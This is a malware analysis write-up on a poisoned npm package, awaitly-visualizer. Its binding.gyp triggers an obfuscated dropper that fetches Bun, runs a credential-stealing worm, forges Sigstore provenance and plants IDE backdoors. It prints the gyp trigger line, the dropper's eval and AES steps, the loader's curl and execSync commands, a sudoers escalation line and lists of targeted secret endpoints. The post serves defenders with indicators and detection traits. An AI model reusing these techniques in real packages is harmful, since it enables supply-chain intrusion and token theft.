---
title: "awaitly-visualizer: The miasma continues to floweth — a binding.gyp Bun worm"
date: 2026-06-04
summary: "No install hook to flag — npm auto-builds the binding.gyp it ships, which fetches its own Bun runtime to run a credential-harvesting worm outside node's view, forge Sigstore provenance, and republish the maintainer's other packages."
packageName: awaitly-visualizer
ecosystem: npm
---

<img src="/assets/images/awaitly-visualizer-miasma.jpg" alt="Meme: Emperor Palpatine captioned 'LET THE MIASMA FLOW THROUGH YOU' — a riff on 'let the hate flow through you.' The worm flows the same way: through your install, your cloud tokens, and your own editor, then on to the maintainer's next package.">

`awaitly-visualizer` is a real package — Jag Reehal's Mermaid workflow renderer — wearing a clean bundle over two files that are the entire attack. Nothing in the manifest declares an install hook, yet it runs the moment you install it: the opening move of the Miasma worm's second wave.

## Package metadata

| Field | Value |
| --- | --- |
| Name | `awaitly-visualizer` |
| Version | `11.0.1` |
| Description | `Visualization and rendering for awaitly workflows - Mermaid diagrams, ASCII art, HTML, and more` |
| Author | `Jag Reehal <jag@jagreehal.com>` |
| License | `MIT` |
| Main | `./dist/index.cjs` |
| Dependencies | `pako@^2.1.0` |
| Optional dependencies | `@slack/web-api@^7.13.0` |
| Files | `["dist", "README.md"]` |
| Repository | `git+https://github.com/jagreehal/awaitly.git` |

## Stage 1 — The GYP that builds itself

npm builds any package that ships a `binding.gyp` with no install script, no questions asked. This one buries its trigger in the gyp `sources` array. Gyp's `<!()` form runs a shell and keeps its output, so node-gyp executes the dropper and compiles a stub it pretends is source. The dropper then peels itself: an alphabet rotation feeds `eval`, which AES-128-GCM-decrypts two blobs.

<pre class="lang-js"><code><span class="tok-com"># binding.gyp — npm auto-runs node-gyp; the command hides in "sources"</span>
<span class="tok-str">"sources"</span>: [<span class="tok-str">"&lt;!(node index.js &gt; /dev/null 2&gt;&amp;1 &amp;&amp; echo stub.c)"</span>]

<span class="tok-com">// index.js — rotate → eval → AES-128-GCM, then unpack two blobs</span>
<span class="tok-fn">eval</span>(<span class="tok-fn">rot</span>([<span class="tok-num">40</span>,<span class="tok-num">122</span>,<span class="tok-num">114</span>,…].<span class="tok-fn">map</span>(c =&gt; <span class="tok-fn">String.fromCharCode</span>(c)).<span class="tok-fn">join</span>(<span class="tok-str">""</span>), <span class="tok-num">1</span>))   <span class="tok-com">// alphabet shift, 1 here</span>
<span class="tok-kw">const</span> _d = (k,i,a,c) =&gt; <span class="tok-fn">createDecipheriv</span>(<span class="tok-str">"aes-128-gcm"</span>, …)        <span class="tok-com">// GCM decryptor</span>
<span class="tok-kw">const</span> _b = <span class="tok-fn">_d</span>(<span class="tok-str">"dbe0d7…"</span>, …)   <span class="tok-com">// blob 1: 907-byte Bun loader (eval'd)</span>
<span class="tok-kw">const</span> _p = <span class="tok-fn">_d</span>(<span class="tok-str">"20cdcd…"</span>, …)   <span class="tok-com">// blob 2: 668 KB worm (run under Bun)</span>
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/hidden-payload/eval` | Megabyte single-line `eval` of a char-code array |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/anti-static/obfuscation/encoding/content` | Encoded Node.js `require` payload |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/data/encode/caesar` | `String.fromCharCode` alphabet rotation |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/hidden-payload/runtime` | Text is over 30% digits — embedded ciphertext |

## Stage 2 — Brings its own Bun, then seeps out

The blobs are a 907-byte loader and a 668 KB worm, and the loader's one job is to fetch a runtime that isn't yours. It downloads Bun and runs the worm under it, never node, outside whatever is watching the process tree. Run cleave on the decrypted blob and it indicts itself — a self-shuffling stealer that probes cloud metadata, scrapes CI-runner memory, and grabs every token in reach. Then it spreads, republishing the maintainer's packages under forged Sigstore provenance and seeding IDE backdoors so your editor re-runs what your tokens already lost.

<pre class="lang-js"><code><span class="tok-com">// blob 1 (_b) — fetch a runtime the victim never installed</span>
<span class="tok-kw">const</span> url = <span class="tok-str">"https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-"</span>+os+<span class="tok-str">"-"</span>+a+<span class="tok-str">".zip"</span>
<span class="tok-fn">execSync</span>(<span class="tok-str">'curl -sSL "'</span>+url+<span class="tok-str">'" -o "'</span>+zip+<span class="tok-str">'"'</span>)
<span class="tok-fn">execSync</span>(<span class="tok-str">'unzip -j -o "'</span>+zip+<span class="tok-str">'" -d "'</span>+dir+<span class="tok-str">'"'</span>)

<span class="tok-com">// blob 2 (_p) → /tmp/p&lt;rand&gt;.js, then run with the fetched Bun, not node</span>
<span class="tok-fn">execSync</span>(<span class="tok-str">'"'</span>+<span class="tok-fn">getBunPath</span>()+<span class="tok-str">'" run "'</span>+t+<span class="tok-str">'"'</span>)
</code></pre>

cleave, now on the decrypted 668 KB blob:

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/tools/js-obfuscator` | Advanced array-shuffle self-defense (obfuscator.io) |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/http/upload` | Creates a GitHub repo and uploads to it (`auto_init`) |
| <span class="sev-dot notable" title="notable"></span> | `objectives/discovery/cloud/metadata` | AWS IMDSv2 header `X-aws-ec2-metadata-token` |
| <span class="sev-dot notable" title="notable"></span> | `objectives/credential-access/api-harvest/token` | `npm_[A-Za-z0-9]{36,}` token regex |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/os/env/vars/cicd` | Reads `GITHUB_REPOSITORY` |

Cloud and secret stores in reach, by endpoint:

| Target | Reached via |
| --- | --- |
| AWS | IMDS `169.254.169.254`, SSM Parameter Store, Secrets Manager, STS |
| GCP | metadata server, service-account tokens, `cloudresourcemanager` projects |
| Azure | managed identity, `login.microsoftonline.com`, Key Vault, Graph |
| HashiCorp Vault | `127.0.0.1:8200`, `/home/runner/.vault-token` |
| npm | `/-/whoami`, token list, OIDC token exchange |
| GitHub | org/repo Actions secrets, `Runner.Worker` memory |
| RubyGems | `/api/v1/api_key.json` |

## The miasma continues to floweth

Strip the costume and it's an ordinary credential stealer; the worm part is the `binding.gyp` npm runs for free and the provenance it forges so each reinfection looks signed. This sample is one cell of the second wave [StepSecurity documented](https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm) a day earlier — so let the miasma flow through your install, your tokens, and your editor, then floweth on to the maintainer's other packages.

## Indicators

| Type | Value |
| --- | --- |
| Tarball SHA-256 | [`e3dcc5f7caf2bfe749f2050c39b1f01654e52d45918204b9b8b1c55bf8908395`](https://lab.atomdrift.org/file/e3dcc5f7caf2bfe749f2050c39b1f01654e52d45918204b9b8b1c55bf8908395) |
| `index.js` SHA-256 | [`d9409a6b1fcfe0ef2ba83aab3ff2a4a14770e659c0209829e8551fd50aa67873`](https://lab.atomdrift.org/file/d9409a6b1fcfe0ef2ba83aab3ff2a4a14770e659c0209829e8551fd50aa67873) |
| `binding.gyp` SHA-256 | [`ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90`](https://lab.atomdrift.org/file/ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90) |
| Bun runtime | `https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-<os>-<arch>.zip` |
| Bun staging dir | `/tmp/b-<random>/bun` |
| Dropped payload | `/tmp/p<random>.js` |
| Privilege-escalation line | `echo 'runner ALL=(ALL) NOPASSWD:ALL' > /mnt/runner` |
| Republished artifact | `package-updated.tgz` |
| Exfil artifact | `results/results-<timestamp>.json` |
| IDE backdoors injected | `.claude/setup.mjs`, `.cursor/rules/setup.mdc`, `.vscode/tasks.json` |
</content>
